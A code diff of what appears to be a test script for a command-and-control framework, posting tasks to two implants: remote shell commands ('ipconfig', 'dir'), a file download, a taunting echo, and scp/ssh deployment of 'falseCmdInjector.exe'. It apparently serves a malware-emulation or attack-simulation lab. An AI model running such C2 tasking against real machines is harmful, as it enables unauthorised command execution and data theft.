@@ -24,36 +24,6 @@ testTaskJson = {
 
 client.postTask(malware1id, testTaskJson)
 
-# FDI task
-time.sleep(taskInt)
-result = client.getLastRst(malwareID=malware2id)
-print(result)
-testTaskJson = {
-            'taskType'  : c2Client.CMD_FLG,
-            'startT'    : None,
-            'repeat'    : 1,
-            'exePreT'   : 0,
-            'state'     : c2Client.TASK_P_FLG,
-            'taskData'  : ['ipconfig']
-        }
-
-client.postTask(malware2id, testTaskJson)
-
-# FDI task
-time.sleep(taskInt)
-result = client.getLastRst(malwareID=malware2id)
-print(result)
-testTaskJson = {
-            'taskType'  : c2Client.CMD_FLG,
-            'startT'    : None,
-            'repeat'    : 1,
-            'exePreT'   : 0,
-            'state'     : c2Client.TASK_P_FLG,
-            'taskData'  : ['dir']
-        }
-
-client.postTask(malware2id, testTaskJson)
-
 # spy task
 time.sleep(taskInt)
 result = client.getLastRst(malwareID=malware1id)
@@ -83,21 +53,6 @@ testTaskJson = {
         }
 
 client.postTask(malware1id, testTaskJson)
-
-# FDI task
-time.sleep(taskInt)
-result = client.getLastRst(malwareID=malware2id)
-print(result)
-testTaskJson = {
-            'taskType'  : c2Client.DOWNLOAD_FLG,
-            'startT'    : None,
-            'repeat'    : 1,
-            'exePreT'   : 0,
-            'state'     : c2Client.TASK_P_FLG,
-            'taskData'  : ['2023-12-13_100327.png']
-        }
-
-client.postTask(malware2id, testTaskJson)
 
 # spy task
 time.sleep(taskInt)
@@ -173,20 +128,6 @@ testTaskJson = {
 
 client.postTask(malware1id, testTaskJson)
 
-# FDI task
-time.sleep(taskInt)
-result = client.getLastRst(malwareID=malware2id)
-print(result)
-testTaskJson = {
-            'taskType'  : c2Client.CMD_FLG,
-            'startT'    : None,
-            'repeat'    : 1,
-            'exePreT'   : 0,
-            'state'     : c2Client.TASK_P_FLG,
-            'taskData'  : ['echo hello I am a hacker, you comptuer is under my control']
-        }
-client.postTask(malware2id, testTaskJson)
-
 # spy task
 time.sleep(taskInt)
 result = client.getLastRst(malwareID=malware1id)
@@ -216,6 +157,96 @@ testTaskJson = {
         }
 
 client.postTask(malware1id, testTaskJson)
+
+# spy task
+time.sleep(taskInt)
+result = client.getLastRst(malwareID=malware1id)
+print(result)
+testTaskJson = {
+            'taskType'  : "scpFile",
+            'startT'    : None,
+            'repeat'    : 1,
+            'exePreT'   : 0,
+            'state'     : c2Client.TASK_P_FLG,
+            'taskData'  : "falseCmdInjector.exe"
+        }
+
+client.postTask(malware1id, testTaskJson)
+
+
+time.sleep(taskInt)
+result = client.getLastRst(malwareID=malware1id)
+print(result)
+testTaskJson = {
+            'taskType'  : "sshRun",
+            'startT'    : None,
+            'repeat'    : 1,
+            'exePreT'   : 0,
+            'state'     : c2Client.TASK_P_FLG,
+            'taskData'  : "falseCmdInjector.exe"
+        }
+
+client.postTask(malware1id, testTaskJson)
+
+# ---------------------------
+# FDI task
+time.sleep(taskInt)
+result = client.getLastRst(malwareID=malware2id)
+print(result)
+testTaskJson = {
+            'taskType'  : c2Client.CMD_FLG,
+            'startT'    : None,
+            'repeat'    : 1,
+            'exePreT'   : 0,
+            'state'     : c2Client.TASK_P_FLG,
+            'taskData'  : ['ipconfig']
+        }
+
+client.postTask(malware2id, testTaskJson)
+
+# FDI task
+time.sleep(taskInt)
+result = client.getLastRst(malwareID=malware2id)
+print(result)
+testTaskJson = {
+            'taskType'  : c2Client.CMD_FLG,
+            'startT'    : None,
+            'repeat'    : 1,
+            'exePreT'   : 0,
+            'state'     : c2Client.TASK_P_FLG,
+            'taskData'  : ['dir']
+        }
+
+client.postTask(malware2id, testTaskJson)
+
+# FDI task
+time.sleep(taskInt)
+result = client.getLastRst(malwareID=malware2id)
+print(result)
+testTaskJson = {
+            'taskType'  : c2Client.DOWNLOAD_FLG,
+            'startT'    : None,
+            'repeat'    : 1,
+            'exePreT'   : 0,
+            'state'     : c2Client.TASK_P_FLG,
+            'taskData'  : ['2023-12-13_100327.png']
+        }
+
+client.postTask(malware2id, testTaskJson)
+
+# FDI task
+time.sleep(taskInt)
+result = client.getLastRst(malwareID=malware2id)
+print(result)
+testTaskJson = {
+            'taskType'  : c2Client.CMD_FLG,
+            'startT'    : None,
+            'repeat'    : 1,
+            'exePreT'   : 0,
+            'state'     : c2Client.TASK_P_FLG,
+            'taskData'  : ['echo hello I am a hacker, you comptuer is under my control']
+        }
+client.postTask(malware2id, testTaskJson)
 
 # FDI task
 time.sleep(taskInt)
